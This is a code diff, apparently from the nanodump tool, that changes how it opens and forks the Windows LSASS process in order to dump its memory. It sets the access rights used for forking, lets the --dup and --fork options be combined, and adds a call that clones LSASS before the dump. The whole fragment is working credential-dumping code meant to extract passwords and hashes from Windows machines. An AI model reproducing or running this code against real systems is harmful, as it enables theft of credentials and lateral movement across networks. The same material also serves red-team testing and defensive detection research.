@@ -930,7 +930,6 @@ void go(char* args, int length)
             nanodump_binary,
             dump_name,
             fork,
-            dup,
             use_valid_sig,
             pid
         );
@@ -953,10 +952,18 @@ void go(char* args, int length)
         return;
     }
 
+    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
+    DWORD permissions = LSASS_PERMISSIONS;
+    if (fork)
+    {
+        permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
+    }
+
     HANDLE hProcess = obtain_lsass_handle(
         pid,
-        fork,
+        permissions,
         dup,
+        fork,
         FALSE,
         dump_name
     );
@@ -1165,21 +1172,9 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    if (dup && fork)
-    {
-        printf("Can't set both --dup and --fork\n");
-        return -1;
-    }
-
     if (dup && use_seclogon)
     {
         printf("Can't set both --dup and --seclogon\n");
-        return -1;
-    }
-
-    if (fork && use_seclogon)
-    {
-        printf("Can't set both --fork and --seclogon\n");
         return -1;
     }
 
@@ -1214,7 +1209,6 @@ int main(int argc, char* argv[])
             argv[0],
             dump_name,
             fork,
-            dup,
             use_valid_sig,
             pid
         );
@@ -1237,13 +1231,30 @@ int main(int argc, char* argv[])
         }
     }
 
+    // by default, PROCESS_QUERY_INFORMATION|PROCESS_VM_READ
+    DWORD permissions = LSASS_PERMISSIONS;
+    if (fork)
+    {
+        permissions = PROCESS_QUERY_INFORMATION|PROCESS_CREATE_PROCESS;
+    }
+
     HANDLE hProcess = obtain_lsass_handle(
         pid,
-        fork,
+        permissions,
         dup,
+        fork,
         is_seclogon_stage_2,
         dump_name
     );
+
+    if (fork)
+    {
+        hProcess = fork_lsass_process(
+            0,
+            hProcess
+        );
+    }
+
     if (!hProcess)
         return FALSE;
 
